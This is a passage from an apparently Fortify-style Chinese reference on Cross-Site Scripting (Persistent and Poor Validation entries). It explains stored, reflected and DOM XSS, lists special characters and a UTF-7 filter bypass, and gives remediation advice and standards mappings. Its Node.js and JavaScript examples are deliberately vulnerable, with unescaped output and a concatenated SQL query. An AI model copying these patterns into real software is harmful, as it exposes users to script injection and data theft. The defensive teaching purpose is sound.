<p>在应用程序中确定针对 XSS 攻击执行验证的正确要点，以及验证过程中要考虑的特殊字符之后，下一个难点就是确定验证过程中处理各种特殊字符的方式。如果应用程序认定某些特殊字符为无效输入，那么您可以拒绝任何带有这些无效特殊字符的输入。第二种选择就是采用过滤手段来删除这些特殊字符。然而，过滤的负面作用在于，过滤内容的显示将发生改变。在需要完整显示输入内容的情况下，过滤的这种负面作用可能是无法接受的。</p>
<p>如果必须接受带有特殊字符的输入，并将其准确地显示出来，验证机制一定要对所有特殊字符进行编码，以便删除其具有的含义。官方的 HTML 规范 [2] 提供了特殊字符对应的 ISO 8859-1 编码值的完整列表。</p>
<p>许多应用程序服务器都试图避免应用程序出现 Cross-Site Scripting 漏洞，具体做法是为负责设置特定 HTTP 响应内容的函数提供各种实现方式，以检验是否存在进行 Cross-Site Scripting 攻击必需的字符。不要依赖运行应用程序的服务器，以此确保该应用程序的安全。开发了某个应用程序后，并不能保证在其生命周期中它会在哪些应用程序服务器中运行。由于标准和已知盗取方式的演变，我们不能保证应用程序服务器也会保持同步。</p>
<h5 id="REFERENCES-19"><a href="#REFERENCES-19" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Understanding Malicious Content Mitigation for Web Developers CERT</p>
<p>[2] HTML 4.01 Specification W3</p>
<p>[3] XSS via a spoofed React element Daniel LeCheminant</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 79, CWE ID 80 </p>
<p>[5] Standards Mapping - Common Weakness Enumeration Top 25 2019 [2] CWE ID 079 </p>
<p>[6] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001310, CCI-002754 </p>
<p>[7] Standards Mapping - FIPS200 SI </p>
<p>[8] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[9] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[10] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.3.3 Output Encoding and Injection Prevention Requirements, 5.3.6 Output Encoding and Injection Prevention Requirements </p>
<p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection </p>
<p>[12] Standards Mapping - OWASP Top 10 2004 A4 Cross Site Scripting </p>
<p>[13] Standards Mapping - OWASP Top 10 2007 A1 Cross Site Scripting (XSS) </p>
<p>[14] Standards Mapping - OWASP Top 10 2010 A2 Cross-Site Scripting (XSS) </p>
<p>[15] Standards Mapping - OWASP Top 10 2013 A3 Cross-Site Scripting (XSS) </p>
<p>[16] Standards Mapping - OWASP Top 10 2017 A7 Cross-Site Scripting (XSS) </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.4 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.7 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.7 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.7 </p>
<p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.7 </p>
<p>[23] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.7 </p>
<p>[24] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[25] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 079 </p>
<p>[26] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 079 </p>
<p>[27] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 079 </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3580 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3580 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3580 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3580 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3580 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3580 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3580 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[41] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[42] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[43] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[44] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[45] Standards Mapping - Web Application Security Consortium 24 + 2 Cross-Site Scripting </p>
<p>[46] Standards Mapping - Web Application Security Consortium Version 2.00 Cross-Site Scripting (WASC-08) </p>
<h4 id="Cross-Site-Scripting-Persistent"><a href="#Cross-Site-Scripting-Persistent" class="headerlink" title="Cross-Site Scripting: Persistent"></a>Cross-Site Scripting: Persistent</h4><h5 id="ABSTRACT-20"><a href="#ABSTRACT-20" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>向一个 Web 浏览器发送未经验证的数据会导致该浏览器执行恶意代码。</p>
<h5 id="EXPLANATION-20"><a href="#EXPLANATION-20" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Cross-Site Scripting (XSS) 漏洞在以下情况下发生：</p>
<ol>
<li><p>数据通过一个不可信赖的数据源进入 Web 应用程序。对于 Persistent（也称为 Stored）XSS，不可信赖的数据源通常为数据库或其他后端数据存储，而对于 Reflected XSS，该数据源通常为 Web 请求。</p>
</li>
<li><p>未经验证但包含在动态内容中的数据将传送给 Web 用户。</p>
</li>
</ol>
<p>传送到 Web 浏览器的恶意内容通常采用 JavaScript 代码片段的形式，但也可能会包含一些 HTML、Flash 或者其他任意一种可以被浏览器执行的代码。基于 XSS 的攻击手段花样百出，几乎是无穷无尽的，但通常它们都会包含传输给攻击者的私人数据（如 Cookie 或者其他会话信息）。在攻击者的控制下，指引受害者进入恶意的网络内容；或者利用易受攻击的站点，对用户的机器进行其他恶意操作。</p>
<p>示例 1：下面的 Node.js 代码片段会根据给定的雇员 ID 查询数据库，并打印相应雇员的姓名。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">var http = require(&apos;http&apos;);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">function listener(request, response)&#123;</span><br><span class="line"></span><br><span class="line">  connection.query(&apos;SELECT * FROM emp WHERE eid=&quot;&apos; + eid + &apos;&quot;&apos;, function(err, rows)&#123;</span><br><span class="line"></span><br><span class="line">    if (!err &amp;&amp; rows.length &gt; 0)&#123;</span><br><span class="line"></span><br><span class="line">      response.write(&apos;&lt;p&gt;Welcome, &apos; + rows[0].name + &apos;!&lt;/p&gt;&apos;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">http.createServer(listener).listen(8080);</span><br></pre></td></tr></table></figure>
<p>如果对 name 的值处理得当，该代码就能正常地执行各种功能；如若处理不当，就会对代码的盗取行为无能为力。这段代码暴露出的危险较小，因为 name 的值是从数据库中读取的，而且显然这些内容是由应用程序管理的。然而，如果 name 的值是由用户提供的数据产生，数据库就会成为恶意内容沟通的通道。如果不对数据库中存储的所有数据进行恰当的输入验证，那么攻击者就可以在用户的 Web 浏览器中执行恶意命令。这种类型的 Persistent XSS（也称为 Stored XSS）盗取极其阴险狡猾，因为数据存储导致的间接性使得辨别威胁的难度增大，而且还提高了一个攻击影响多个用户的可能性。XSS 盗取会从访问提供留言簿 (guestbook) 的网站开始。攻击者会在这些留言簿的条目中嵌入 JavaScript，接下来所有访问该留言簿的用户都会执行这些恶意代码。</p>
<p>示例 2：以下 Node.js 代码片段会在 HTTP 请求中读取雇员 ID eid，并将其显示给用户。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">var http = require(&apos;http&apos;);</span><br><span class="line"></span><br><span class="line">var url = require(&apos;url&apos;);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">function listener(request, response)&#123;</span><br><span class="line"></span><br><span class="line">  var eid = url.parse(request.url, true)[&apos;query&apos;][&apos;eid&apos;];</span><br><span class="line"></span><br><span class="line">  if (eid !== undefined)&#123;</span><br><span class="line"></span><br><span class="line">    response.write(&apos;&lt;p&gt;Welcome, &apos; + eid + &apos;!&lt;/p&gt;&apos;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">http.createServer(listener).listen(8080);</span><br></pre></td></tr></table></figure>
<p>如Example 1 中所示，如果 eid 只包含标准的字母数字文本，此代码将会正确运行。如果 eid 中的某个值包含元字符或源代码，则 Web 浏览器就会在显示 HTTP 响应时执行该代码。</p>
<p>起初，这个例子似乎是不会轻易遭受攻击的。毕竟，有谁会输入导致恶意代码在自己电脑上运行的 URL 呢？真正的危险在于攻击者会创建恶意的 URL，然后采用电子邮件或社交工程的欺骗手段诱使受害者访问此 URL 的链接。当受害者单击这个链接时，他们不知不觉地通过易受攻击的网络应用程序，将恶意内容带到了自己的电脑中。这种对易受攻击的 Web 应用程序进行盗取的机制通常被称为反射式 XSS。</p>
<p>正如例子中所显示的，XSS 漏洞是由于 HTTP 响应中包含了未经验证的数据代码而引起的。受害者遭受 XSS 攻击的途径有三种：</p>
<ul>
<li><p>如Example 1 中所示，应用程序将危险数据存储在数据库或其他可信赖的数据存储中。这些危险数据随后会被读回到应用程序中，并包含在动态内容中。在以下情况下会发生 Persistent XSS 漏洞利用：攻击者将危险内容注入到数据存储中，而这些危险内容随后会被读取并包含在动态内容中。从攻击者的角度看，注入恶意内容的最佳位置莫过于显示给许多用户或显示给特定相关用户的区域。这些相关用户通常在应用程序中具备较高的特权，或者可以与敏感数据交互，这些数据对攻击者来说具有利用价值。如果某一个用户执行了恶意内容，攻击者就有可能以该用户的名义执行某些需要特权的操作，或者获得该用户个人敏感数据的访问权。</p>
</li>
<li><p>如Example 2 中所示，系统从 HTTP 请求中直接读取数据，并在 HTTP 响应中返回数据。当攻击者诱使用户为易受攻击的 Web 应用程序提供危险内容，而这些危险内容随后会反馈给用户并在 Web 浏览器中执行时，就会发生 Reflected XSS 漏洞利用。发送恶意内容最常用的方法是，将恶意内容作为一个参数包含在公开发布或通过电子邮件直接发送给受害者的 URL 中。以这种手段构造的 URL 已成为多种网络钓鱼阴谋的核心，攻击者会借此诱骗受害者访问指向易受攻击站点的 URL。当该站点将攻击者的内容反馈给受害者后，便会执行这些内容，接下来会将用户计算机中的各种私密信息（比如可能包含会话信息的 Cookie）传输给攻击者，或者执行其他恶意活动。</p>
</li>
</ul>
<p>— 应用程序之外的数据源将危险数据储存在一个数据库或其他数据存储器中，随后这些危险数据被当作可信赖的数据回写到应用程序中，并储存在动态内容中。</p>
<h5 id="RECOMMENDATIONS-20"><a href="#RECOMMENDATIONS-20" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>针对 XSS 的解决方法是，确保在适当位置进行验证，并检验其属性是否正确。</p>
<p>由于 XSS 漏洞在应用程序的输出中包含恶意数据时出现，因此，合乎逻辑的方法是在数据流出应用程序的前一刻对其进行验证。然而，由于 Web 应用程序常常会包含复杂而难以理解的代码，用以生成动态内容，因此，这一方法容易产生遗漏错误（遗漏验证）。降低这一风险的有效途径是对 XSS 也执行输入验证。</p>
<p>由于 Web 应用程序必须验证输入信息以避免其他漏洞（如 SQL Injection），因此，一种相对简单的解决方法是，加强一个应用程序现有的输入验证机制，将 XSS 检测包括其中。尽管有一定的价值，但 XSS 输入验证并不能取代严格的输出验证。应用程序可能通过共享的数据存储器或其他可信赖的数据源接受输入，而该数据存储器所接受的输入源可能并未执行适当的输入验证。因此，应用程序不能间接地依赖于该数据或其他任意数据的安全性。这就意味着，避免 XSS 漏洞的最佳方法是验证所有进入应用程序以及由应用程序传送至用户端的数据。</p>
<p>针对 XSS 漏洞进行验证最安全的方式是，创建一份安全字符白名单，允许其中的字符出现在 HTTP 内容中，并且只接受完全由这些经认可的字符组成的输入。例如，有效的用户名可能仅包含字母数字字符，电话号码可能仅包含 0-9 的数字。然而，这种解决方法在 Web 应用程序中通常是行不通的，因为许多字符对浏览器来说都具有特殊的含义，编码时这些字符必须被视为合法输入，例如，一个 Web 设计电子公告栏就必须接受其用户提供的 HTML 片段。</p>
<p>更灵活的方法是列入黑名单，但其安全性较差，这种方法在使用输入之前就有选择地拒绝或转义了潜在的危险字符。为了创建这样一个列表，首先需要了解对于 Web 浏览器具有特殊含义的字符集。虽然 HTML 标准定义了哪些字符具有特殊含义，但是许多 Web 浏览器会设法更正 HTML 中的常见错误，并可能在特定的上下文中认为其他字符具有特殊含义，这就是我们不鼓励使用黑名单作为阻止 XSS 的方法的原因。卡耐基梅隆大学 (Carnegie Mellon University) 软件工程学院 (Software Engineering Institute) 下属的 CERT(R) (CERT(R) Coordination Center) 合作中心提供了有关各种上下文中认定的特殊字符的具体信息 [1]：</p>
<p>在有关块级别元素的内容中（位于一段文本的中间）：</p>
<p>－“&lt;”是一个特殊字符，因为它可以引入一个标签。</p>
<p>－“&amp;”是一个特殊字符，因为它可以引入一个字符实体。</p>
<p>－“&gt;”是一个特殊字符，之所以某些浏览器将其认定为特殊字符，是基于一种假设，即该页的作者本想在前面添加一个“&lt;”，却错误地将其遗漏了。</p>
<p>下面的这些原则适用于属性值：</p>
<p>－ 对于外加双引号的属性值，双引号是特殊字符，因为它们标记了该属性值的结束。</p>
<p>－ 对于外加单引号的属性值，单引号是特殊字符，因为它们标记了该属性值的结束。</p>
<p>－ 对于不带任何引号的属性值，空格字符（如空格符和制表符）是特殊字符。</p>
<p>-“&amp;”与某些特定变量一起使用时是特殊字符，因为它引入了一个字符实体。</p>
<p>例如，在 URL 中，搜索引擎可能会在结果页面内提供一个链接，用户可以点击该链接来重新运行搜索。可以将这一方法运用于编写 URL 中的搜索查询语句，这将引入更多特殊字符：</p>
<p>－ 空格符、制表符和换行符是特殊字符，因为它们标记了 URL 的结束。</p>
<p>－ “&amp;”是特殊字符，因为它可引入一个字符实体或分隔 CGI 参数。</p>
<p>－ 非 ASCII 字符（即 ISO-8859-1 编码表中所有大于 127 的字符）不允许出现在 URL 中，因此这些字符在此环境下被视为特殊字符。</p>
<p>－ 在服务器端对在 HTTP 转义序列中编码的参数进行解码时，必须过滤掉输入中的“%”符号。例如，当输入中出现“%68%65%6C%6C%6F”时，只有从输入的内容中过滤掉“%”，上述字符串才能在网页上显示为“hello”。</p>
<p>在 <code>&lt;SCRIPT&gt; &lt;/SCRIPT&gt;</code>的正文内：</p>
<p>－ 如果可以将文本直接插入到已有的脚本标签中，应该过滤掉分号、省略号、中括号和换行符。</p>
<p>服务器端脚本：</p>
<p>－ 如果服务器端脚本会将输入中的感叹号 (!) 转换成输出中的双引号 (“)，则可能需要对此进行更多过滤。</p>
<p>其他可能出现的情况：</p>
<p>－ 如果攻击者以 UTF-7 格式提交了请求，则特殊字符“&lt;”可能会显示为“+ADw-”，并可能会绕过过滤。如果输出包含在没有确切指定编码格式的网页中，某些浏览器就会设法根据内容自动识别编码（此处采用 UTF-7 格式）。</p>
<p>在应用程序中确定针对 XSS 攻击执行验证的正确要点，以及验证过程中要考虑的特殊字符之后，下一个难点就是确定验证过程中处理各种特殊字符的方式。如果应用程序认定某些特殊字符为无效输入，那么您可以拒绝任何带有这些无效特殊字符的输入。第二种选择就是采用过滤手段来删除这些特殊字符。然而，过滤的负面作用在于，过滤内容的显示将发生改变。在需要完整显示输入内容的情况下，过滤的这种负面作用可能是无法接受的。</p>
<p>如果必须接受带有特殊字符的输入，并将其准确地显示出来，验证机制一定要对所有特殊字符进行编码，以便删除其具有的含义。官方的 HTML 规范 [2] 提供了特殊字符对应的 ISO 8859-1 编码值的完整列表。</p>
<p>许多应用程序服务器都试图避免应用程序出现 Cross-Site Scripting 漏洞，具体做法是为负责设置特定 HTTP 响应内容的函数提供各种实现方式，以检验是否存在进行 Cross-Site Scripting 攻击必需的字符。不要依赖运行应用程序的服务器，以此确保该应用程序的安全。开发了某个应用程序后，并不能保证在其生命周期中它会在哪些应用程序服务器中运行。由于标准和已知盗取方式的演变，我们不能保证应用程序服务器也会保持同步。</p>
<h5 id="REFERENCES-20"><a href="#REFERENCES-20" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Understanding Malicious Content Mitigation for Web Developers CERT</p>
<p>[2] HTML 4.01 Specification W3</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 79, CWE ID 80 </p>
<p>[4] Standards Mapping - Common Weakness Enumeration Top 25 2019 [2] CWE ID 079 </p>
<p>[5] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001310, CCI-002754 </p>
<p>[6] Standards Mapping - FIPS200 SI </p>
<p>[7] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[8] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[9] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.3.3 Output Encoding and Injection Prevention Requirements, 5.3.6 Output Encoding and Injection Prevention Requirements </p>
<p>[10] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection </p>
<p>[11] Standards Mapping - OWASP Top 10 2004 A4 Cross Site Scripting </p>
<p>[12] Standards Mapping - OWASP Top 10 2007 A1 Cross Site Scripting (XSS) </p>
<p>[13] Standards Mapping - OWASP Top 10 2010 A2 Cross-Site Scripting (XSS) </p>
<p>[14] Standards Mapping - OWASP Top 10 2013 A3 Cross-Site Scripting (XSS) </p>
<p>[15] Standards Mapping - OWASP Top 10 2017 A7 Cross-Site Scripting (XSS) </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.4 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.7 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.7 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.7 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.7 </p>
<p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.7 </p>
<p>[23] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[24] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 079 </p>
<p>[25] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 079 </p>
<p>[26] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 079 </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3580 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3580 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3580 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3580 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3580 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3580 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3580 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[41] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[42] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[43] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I </p>
<p>[44] Standards Mapping - Web Application Security Consortium 24 + 2 Cross-Site Scripting </p>
<p>[45] Standards Mapping - Web Application Security Consortium Version 2.00 Cross-Site Scripting (WASC-08) </p>
<h4 id="Cross-Site-Scripting-Poor-Validation"><a href="#Cross-Site-Scripting-Poor-Validation" class="headerlink" title="Cross-Site Scripting: Poor Validation"></a>Cross-Site Scripting: Poor Validation</h4><h5 id="ABSTRACT-21"><a href="#ABSTRACT-21" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>依靠 HTML、XML 和其他类型的编码来验证用户输入可能会导致浏览器执行恶意代码。</p>
<h5 id="EXPLANATION-21"><a href="#EXPLANATION-21" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>使用特定的编码函数能避免一部分 cross-site scripting 攻击，但不能完全避免。根据数据出现的上下文，除 HTML 编码的基本字符 &lt;、&gt;、&amp; 和 “ 以及 XML 编码的字符 &lt;、&gt;、&amp;、” 和 ‘ 之外，其他字符可能具有元意。依靠此类编码函数等同于用一个安全性较差的黑名单来防止 cross-site scripting 攻击，并且可能允许攻击者注入恶意代码，并在浏览器中加以执行。由于不可能始终准确地确定静态显示数据的上下文，所以即便进行了编码，Fortify 安全编码规则包仍会报告跨站脚本攻击结果，并将其显示为 Cross-Site Scripting: Poor Validation 问题。</p>
<p>Cross-Site Scripting (XSS) 漏洞在以下情况下发生：</p>
<ol>
<li><p>数据通过一个不可信赖的数据源进入 Web 应用程序。对于基于 DOM 的 XSS，将从 URL 参数或浏览器中的其他值读取数据，并使用客户端代码将其重新写入该页面。对于 Reflected XSS，不可信赖的数据源通常为 Web 请求，而对于 Persisted（也称为 Stored）XSS，该数据源通常为数据库或其他后端数据存储。</p>
</li>
<li><p>未经验证但包含在动态内容中的数据将传送给 Web 用户。对于基于 DOM 的 XSS，任何时候当受害人的浏览器解析 HTML 页面时，恶意内容都将作为 DOM（文档对象模型）创建的一部分执行。</p>
</li>
</ol>
<p>传送到 Web 浏览器的恶意内容通常采用 JavaScript 代码片段的形式，但也可能会包含一些 HTML、Flash 或者其他任意一种可以被浏览器执行的代码。基于 XSS 的攻击手段花样百出，几乎是无穷无尽的，但通常它们都会包含传输给攻击者的私人数据（如 Cookie 或者其他会话信息）。在攻击者的控制下，指引受害者进入恶意的网络内容；或者利用易受攻击的站点，对用户的机器进行其他恶意操作。</p>
<p>示例：下面的 JavaScript 代码片段可从 HTTP 请求中读取雇员 ID eid，对其进行转义并显示给用户。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">var pos=document.URL.indexOf(&quot;eid=&quot;)+4;</span><br><span class="line"></span><br><span class="line">document.write(escape(document.URL.substring(pos,document.URL.length)));</span><br><span class="line"></span><br><span class="line">&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
<p>如果eid只包含标准的字母或数字文本，这个例子中的代码就能正确运行。如果eid中的某个值包含元字符或源代码，则 Web 浏览器就会在显示 HTTP 响应时执行该代码。</p>
<p>起初，这个例子似乎是不会轻易遭受攻击的。毕竟，有谁会输入导致恶意代码在自己电脑上运行的 URL 呢？真正的危险在于攻击者会创建恶意的 URL，然后采用电子邮件或社交工程的欺骗手段诱使受害者访问此 URL 的链接。当受害者单击这个链接时，他们不知不觉地通过易受攻击的网络应用程序，将恶意内容带到了自己的电脑中。这种对易受攻击的 Web 应用程序进行盗取的机制通常被称为反射式 XSS。</p>
<p>正如例子中所显示的，XSS 漏洞是由于 HTTP 响应中包含了未验证的数据代码而引起的。受害者遭受 XSS 攻击的途径有三种：</p>
<p>— 系统从 HTTP 请求中直接读取数据，并在 HTTP 响应中返回数据。当攻击者诱使用户为易受攻击的 Web 应用程序提供危险内容，而这些危险内容随后会反馈给用户并在 Web 浏览器中执行时，就会发生 Reflected XSS 漏洞利用。发送恶意内容最常用的方法是，将恶意内容作为一个参数包含在公开发布或通过电子邮件直接发送给受害者的 URL 中。以这种手段构造的 URL 已成为多种网络钓鱼阴谋的核心，攻击者会借此诱骗受害者访问指向易受攻击站点的 URL。当该站点将攻击者的内容反馈给受害者后，便会执行这些内容，接下来会将用户计算机中的各种私密信息（比如可能包含会话信息的 Cookie）传输给攻击者，或者执行其他恶意活动。</p>
<p>— 应用程序将危险数据存储在数据库或其他可信赖的数据存储器中。这些危险数据随后会被回写到应用程序中，并包含在动态内容中。Persistent XSS 盗取发生在如下情况：攻击者将危险内容注入到数据存储器中，且该存储器之后会被读取并包含在动态内容中。从攻击者的角度看，注入恶意内容的最佳位置莫过于一个面向许多用户，尤其是相关用户显示的区域。相关用户通常在应用程序中具备较高的特权，或相互之间交换敏感数据，这些数据对攻击者来说有利用价值。如果某一个用户执行了恶意内容，攻击者就有可能以该用户的名义执行某些需要特权的操作，或者获得该用户个人所有的敏感数据的访问权限。</p>
<p>— 应用程序之外的数据源将危险数据储存在一个数据库或其他数据存储器中，随后这些危险数据被当作可信赖的数据回写到应用程序中，并储存在动态内容中。</p>
<h5 id="RECOMMENDATIONS-21"><a href="#RECOMMENDATIONS-21" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>针对 XSS 的解决方法是，确保在适当位置进行验证，并检验其属性是否正确。</p>
<p>由于 XSS 漏洞在应用程序的输出中包含恶意数据时出现，因此，合乎逻辑的方法是在数据流出应用程序的前一刻对其进行验证。然而，由于 Web 应用程序常常会包含复杂而难以理解的代码，用以生成动态内容，因此，这一方法容易产生遗漏错误（遗漏验证）。降低这一风险的有效途径是对 XSS 也执行输入验证。</p>
